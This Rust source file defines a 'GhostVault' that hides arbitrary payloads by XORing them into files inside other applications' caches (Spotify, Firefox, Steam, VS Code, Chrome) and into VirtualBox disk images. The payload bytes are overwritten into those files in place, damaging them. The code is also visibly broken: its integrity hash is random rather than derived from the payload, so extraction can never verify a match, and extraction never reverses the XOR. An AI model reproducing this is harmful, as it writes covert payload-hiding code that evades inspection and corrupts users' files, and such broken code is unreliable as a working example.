use anyhow::{anyhow, Result};
use rand::RngCore;
use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;
use rand::Rng;

const STEGANO_PATHS: &[&str] = &[
    "~/.cache/spotify/Storage/",
    "~/.mozilla/firefox/*.default-release/startupCache/",
    "~/.local/share/Steam/steamapps/shadercache/",
    "~/.config/Code/User/globalStorage/",
    "~/.config/Google/Chrome/Default/Service Worker/",
];

#[derive(Debug, Clone)]
pub struct DetachedHeader {
    pub nonce: [u8; 24],
    pub salt: [u8; 32],
    pub integrity_hash: [u8; 32],
}

impl DetachedHeader {
    pub fn new() -> Self {
        let mut rng = rand::thread_rng();
        let mut nonce = [0u8; 24];
        let mut salt = [0u8; 32];
        let mut integrity_hash = [0u8; 32];
        rng.fill_bytes(&mut nonce);
        rng.fill_bytes(&mut salt);
        rng.fill_bytes(&mut integrity_hash);
        DetachedHeader {
            nonce,
            salt,
            integrity_hash,
        }
    }
    
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut bytes = Vec::with_capacity(88);
        bytes.extend_from_slice(&self.nonce);
        bytes.extend_from_slice(&self.salt);
        bytes.extend_from_slice(&self.integrity_hash);
        bytes
    }

    pub fn from_bytes(bytes: &[u8]) -> Result<Self> {
        if bytes.len() != 88 {
            return Err(anyhow!("Invalid header length"));
        }
        let mut nonce = [0u8; 24];
        let mut salt = [0u8; 32];
        let mut integrity_hash = [0u8; 32];
        nonce.copy_from_slice(&bytes[0..24]);
        salt.copy_from_slice(&bytes[24..56]);
        integrity_hash.copy_from_slice(&bytes[56..88]);
        Ok(DetachedHeader {
            nonce,
            salt,
            integrity_hash,
        })
    }
}

pub struct GhostVault {
    target_paths: Vec<PathBuf>,
}

impl GhostVault {
    pub fn new() -> Result<Self> {
        let mut target_paths = Vec::new();
        for path_str in STEGANO_PATHS {
            let expanded = shellexpand::tilde(path_str).to_string();
            let path = PathBuf::from(&expanded);
            if path.exists() {
                target_paths.push(path);
            }
        }
        if let Ok(home) = std::env::var("HOME") {
            let vm_path = PathBuf::from(home).join("VirtualBox VMs");
            if vm_path.exists() {
                for entry in WalkDir::new(&vm_path)
                    .into_iter()
                    .filter_map(|e| e.ok())
                {
                    if entry.path().extension().map_or(false, |ext| {
                        ext == "vmdk" || ext == "qcow2" || ext == "vdi"
                    }) {
                        target_paths.push(entry.path().to_path_buf());
                    }
                }
            }
        }
        Ok(GhostVault {
            target_paths,
        })
    }

    pub fn inject_payload(&self, payload: &[u8]) -> Result<PathBuf> {
        if self.target_paths.is_empty() {
            return Err(anyhow!("No suitable target paths found"));
        }
        let mut rng = rand::thread_rng();
        let target_idx = rng.gen_range(0..self.target_paths.len());
        let target_path = &self.target_paths[target_idx];
        let mut file_data = fs::read(target_path)?;
        let injection_point = self.find_injection_point(&file_data, payload.len())?;
        for (i, &byte) in payload.iter().enumerate() {
            file_data[injection_point + i] ^= byte;
        }
        fs::write(target_path, file_data)?;
        Ok(target_path.clone())
    }

    pub fn extract_payload(&self, payload_size: usize, header: &DetachedHeader) -> Result<Vec<u8>> {
        if self.target_paths.is_empty() {
            return Err(anyhow!("No suitable target paths found"));
        }
        for target_path in &self.target_paths {
            if let Ok(payload) = self.extract_from_file(target_path, payload_size, header) {
                return Ok(payload);
            }
        }
        Err(anyhow!("Payload not found in any target file"))
    }
    
    fn find_injection_point(&self, data: &[u8], payload_size: usize) -> Result<usize> {
        if data.len() < payload_size + 100 {
            return Err(anyhow!("File too small for injection"));
        }
        let mut best_point = 0;
        let mut best_entropy = 0.0;
        let window_size = 256;
        let step = 64;
        for i in (0..=(data.len() - payload_size - window_size)).step_by(step) {
            let window = &data[i..i + window_size];
            let entropy = self.calculate_entropy(window);
            if entropy > best_entropy {
                best_entropy = entropy;
                best_point = i + window_size / 2;
            }
        }
        if best_point + payload_size > data.len() {
            best_point = data.len() - payload_size - 1;
        }
        Ok(best_point)
    }

    fn calculate_entropy(&self, data: &[u8]) -> f64 {
        let mut freq = [0usize; 256];
        for &byte in data {
            freq[byte as usize] += 1;
        }
        let len = data.len() as f64;
        let mut entropy = 0.0;
        for &count in &freq {
            if count > 0 {
                let p = count as f64 / len;
                entropy -= p * p.log2();
            }
        }
        entropy
    }

    fn extract_from_file(&self, path: &Path, payload_size: usize, header: &DetachedHeader) -> Result<Vec<u8>> {
        let file_data = fs::read(path)?;
        let window_size = 256;
        let step = 64;
        for i in (0..=(file_data.len() - payload_size)).step_by(step) {
            let mut payload = vec![0u8; payload_size];
            for j in 0..payload_size {
                payload[j] = file_data[i + j];
            }
            if self.verify_integrity(&payload, header) {
                return Ok(payload);
            }
        }
        Err(anyhow!("Payload not found in file"))
    }
    
    fn verify_integrity(&self, payload: &[u8], header: &DetachedHeader) -> bool {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(&header.nonce);
        hasher.update(&header.salt);
        hasher.update(payload);
        let hash = hasher.finalize();
        hash.as_slice() == header.integrity_hash
    }
}
